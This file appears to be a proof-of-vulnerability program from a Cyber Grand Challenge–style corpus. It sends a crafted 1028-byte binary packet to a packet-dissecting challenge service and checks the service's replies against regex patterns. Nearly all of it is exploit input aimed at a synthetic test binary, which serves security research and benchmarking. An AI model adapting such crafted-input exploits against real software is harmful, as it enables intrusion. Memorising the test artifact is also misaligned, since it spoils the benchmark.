#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xb7\x8b\x27\x56"
         "\x8c\xb1\x64\xad\x6f\x3d\xaa\x83\x45\x00\x00\x00\x48\xaf\xe0\x78"
         "\xfb\xe7\x6a\x30\x87\x90\x39\x28\x2e\xb1\x1c\xc6\xfc\xf0\x95\x6e"
         "\xad\x78\xac\x26\xa9\xb3\xff\x88\x7d\x4f\x04\xcb\x6c\x46\x05\x00"
         "\xc5\x5f\x76\xa9\x5d\x5c\x87\x78\x31\xed\xe4\x3c\x57\x3a\xe4\xd0"
         "\x05\x77\xe4\xa2\x51\x64\xb5\x6f\xbc\xec\x07\x97\xf9\x32\x8c\xac"
         "\xb6\xfc\x05\x3e\x50\x53\xd8\x65\xd1\x6f\x66\x37\xc1\x63\xa5\xe2"
         "\xa7\x4e\xb3\x01\x74\xb7\xa7\xa1\x5f\xcb\x00\x37\x13\x69\x1d\x45"
         "\xba\xa9\x99\xda\xde\x5d\xf0\x7e\xec\x7c\xd7\x85\x25\x18\xec\xfe"
         "\x4d\x1f\x25\x07\x5b\xd6\xe7\x86\xe1\x48\xa8\xd5\x15\x2a\x3a\x03"
         "\xfb\x0e\x17\x35\xa1\x87\xd9\xf6\x26\x74\xa3\x8d\x0d\x1e\xa0\xad"
         "\xe0\xf8\xc1\x96\xeb\xe6\xff\x5b\x13\xd8\x60\x9d\xc6\x57\x84\x37"
         "\xe0\x29\x5c\x75\x1a\x19\xfb\x81\x71\xbc\x7a\x20\xd1\x6f\x2c\x9c"
         "\x85\xac\x5b\xc4\xcf\x38\xd1\x23\x72\x0e\x4c\x98\x45\x3e\xaa\x2f"
         "\x56\x71\x9d\xb4\xf4\x81\x31\x7c\x33\x6d\x02\x4f\x20\x22\x60\x4f"
         "\x6a\x3b\xee\x6e\x7c\x6b\x26\x8e\x75\x9b\x98\x89\x1b\xcf\x32\x96"
         "\xed\x45\x1f\x68\x73\x4b\x69\x11\x29\x21\xec\xcf\x30\x66\x7c\x00"
         "\x68\xc6\xd8\x3c\x85\x0f\xbe\x40\xcf\x08\xf0\xc8\x95\x48\xa9\x20"
         "\x21\xcd\xfb\x8b\xb3\x3c\x18\x4a\xe5\x01\x87\xa8\x7e\x84\x72\x82"
         "\x27\x56\x8c\x19\x5e\x84\x01\xcf\x13\x3d\x8e\xc9\x07\x35\x6d\xf0"
         "\x0c\xec\xd5\xd6\x42\xfc\x10\x78\xf3\x7d\xb7\x8a\x62\x20\x95\xec"
         "\xe2\xc4\x00\x1a\x94\x52\x99\x04\xe3\x04\x3d\xf9\x29\x37\xcd\x65"
         "\xed\x57\xa4\x67\xd9\xe4\xe1\x38\xdf\x79\x49\xd8\xe0\x87\xeb\xa2"
         "\x35\xe5\x9d\x97\x2d\x03\x32\xc1\xac\x8c\x91\xc6\xd5\x22\x22\x2b"
         "\xe4\x39\x1f\x3f\x49\x2f\xc1\xbd\x1d\xb1\x97\x68\x6a\xa6\x5f\x94"
         "\x7f\x59\x94\xce\x29\x9a\xc4\x46\xd5\xac\x24\xe9\xe0\xd1\x63\x68"
         "\x30\x18\x0e\x6b\xf0\x45\xf8\xb6\x84\x29\x1d\xce\x7c\x9f\xeb\xbb"
         "\x22\xc8\xdc\x71\x9c\xe5\xe0\x99\xa1\xd4\xd7\x9c\xe7\x69\x52\x8e"
         "\xc4\x4e\x1b\x00\x9b\x20\x1d\x4a\x96\x21\xe5\xdd\xfa\xe9\x47\x1e"
         "\x17\x36\x5b\xad\xbe\xac\x1b\xfd\xc4\x26\xe2\xb2\x97\x71\xc2\x8d"
         "\xee\xef\x4d\x52\x3d\x7d\x1b\x0f\xc1\x7a\xba\x85\xb4\x6c\x63\xe5"
         "\x5a\x82\x55\x2a\x0b\xde\x9d\x95\x32\x51\x0d\x08\xc4\x50\x60\x3c"
         "\xb0\x7b\xe6\xac\xc1\xc3\xa3\x63\x53\x89\x08\x3b\x18\x20\xd8\xd1"
         "\xd3\x23\x37\x3e\xc8\x59\x0b\xd0\x73\xfd\xe2\xf0\x55\x2a\x5b\xe2"
         "\xa7\x23\x4f\x8d\xab\x54\x1c\x20\x3c\x55\x6e\x1f\x68\x85\xab\xdc"
         "\xfb\x42\x7b\x3f\xee\x51\xd6\xd0\xaf\xf2\xbc\xa7\x5f\xc7\xf8\x23"
         "\x2c\x59\x5c\x4a\x71\x01\x58\xe9\xf8\xef\x69\x83\xb4\xa6\xfa\xba"
         "\xe5\x54\x19\xf9\xe5\xb4\x61\x51\x5f\x96\x16\x05\x5b\x07\xec\xd4"
         "\xcc\x5a\x05\x9d\x63\x6a\x26\x9b\x4b\x2f\xc2\x1f\xac\xbd\xae\x42"
         "\xae\x0a\xac\x21\x37\x46\x10\xff\x0f\x03\x8e\x24\x82\x94\x36\x0e"
         "\x83\x61\xa4\x6a\x2e\xc7\x01\x17\x2d\x6d\xdc\x12\x78\xc1\x2b\x80"
         "\xc1\x37\x59\xcb\x75\x45\xa1\xa6\xd1\x0f\x6f\x6f\x97\x05\x05\xd6"
         "\xa6\xcc\x04\x6f\xdd\xd1\x81\x4c\x33\x89\xe7\x98\x90\x74\x6b\xd9"
         "\xc8\x6a\x4d\x88\x6e\xb0\x4b\xe8\x6b\xf9\xfa\x08\x13\xfe\xaa\xb3"
         "\xab\x4f\x4b\xca\x9b\x6b\x91\x6c\xf0\xdc\x72\xc6\xb7\x44\xee\xdf"
         "\x1d\x1a\xba\xe4\xb7\x0a\xc0\x1e\x39\xcd\x21\x57\x14\xe6\x7c\xee"
         "\x99\xf0\x69\x2a\xe8\x5a\x05\x2c\x20\x08\xa7\x1f\x68\x95\xcd\xad"
         "\xef\x22\x3c\x40\xdf\x8a\x9b\x6d\x7b\xcb\x7f\x5a\xe2\xb5\x5f\x14"
         "\x5c\x0c\xc8\xa3\x9c\xd5\xf7\x4c\x9c\x96\xff\x7e\x5e\x85\xc1\xd5"
         "\x66\xdf\x9d\x36\x1c\x25\x08\x31\xbd\x81\x28\x24\xd3\xba\x3d\xbc"
         "\x13\xaf\xb1\x43\x01\x98\xd9\x75\xf1\xe0\x16\x78\xfa\xd7\x78\x0d"
         "\x08\x0e\xd7\xc5\x46\x16\x2f\x6b\x6c\xc2\xfc\x0e\xb4\x0d\xaf\x23"
         "\xba\xea\xe8\x70\xa7\x22\x52\x86\xf6\xe0\xe8\xf2\x86\x49\x62\x94"
         "\xf6\x81\xfa\x9b\x2b\x3f\x7b\xf6\xdb\xd2\x4a\xef\x0f\x70\x78\x84"
         "\x61\xd3\xa0\xeb\x1b\x7e\xc3\x27\xc2\xbb\xac\x9c\xa1\xd1\x63\xd1"
         "\x8a\xb9\x61\x05\x24\x6c\x78\x74\xe8\x6f\x92\xd8\x05\x00\x6c\xe7"
         "\x73\xd5\x1b\x9b\x25\xae\x96\xee\x19\xd6\x8b\x7b\xe1\x30\x1b\xc3"
         "\xa0\xa6\xb2\x45\x3a\x48\xea\x78\x05\x00\xf1\x26\xfd\xe7\xd3\x37"
         "\xb6\x22\x79\xf2\x98\x94\x06\xd2\xd8\x43\x3a\x5d\x81\xc2\x8d\x1f"
         "\x17\x51\xe1\xd0\x0d\xbb\x4d\xbb\x1b\x3d\x05\x00\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===Trinorantumpyramides
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x54\x72\x69\x6e\x6f\x72\x61\x6e\x74\x75\x6d"
         "\x70\x79\x72\x61\x6d\x69\x64\x65\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
